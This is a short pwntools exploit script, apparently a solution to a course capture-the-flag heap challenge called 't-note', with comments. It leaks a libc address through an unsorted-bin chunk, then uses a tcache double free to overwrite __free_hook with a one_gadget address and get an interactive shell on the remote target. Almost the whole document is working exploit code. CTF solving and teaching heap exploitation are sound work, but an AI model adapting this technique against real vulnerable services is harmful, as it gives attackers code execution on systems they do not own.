#!/usr/bin/python3
from pwn import *

context.arch = 'amd64'
l = ELF('libc-2.27.so')

binary = remote('edu-ctf.csie.org', 10179)
#binary = process('./t-note')


def add(size, note):
    binary.sendafter('>', '1')
    binary.sendafter('Size: ', str(size))
    binary.sendafter('Note: ', note)


def show(index):
    binary.sendafter('>', '2')
    binary.sendafter('Index: ', str(index))


def delete(index):
    binary.sendafter('>', '3')
    binary.sendafter('Index: ', str(index))


# Information Leak
# Due to the size, this bin will be in unsorted bins after freed
# Here need to be bigger than small bin
add(0x410, 'leak')
# However, if the chunk immediately next is top chunk, after it's freed,
# it will be merged with top chunk instead of unsorted bins
# To bypass, add another bin first
# Due to tcache, doesn't have to be 0x68 anymore
add(0x20, 'a')
delete(0)
show(0)
binary.recvline()
# Similar to ret2libc, the offset can be found by tracing gdb
l.address = u64(binary.recv(6) + b'\0\0') - 0x3ebca0
success(f'libc -> {hex(l.address)}')

# Double free
delete(1)
delete(1)

# Overwrite freed fd to free hook
add(0x20, p64(l.sym.__free_hook))
# Remove 1 from linked list
add(0x20, 'a')

# Try different ways to trigger malloc, such that it fits the constraints
add(0x20, p64(l.address + 0x4f322))

binary.interactive()
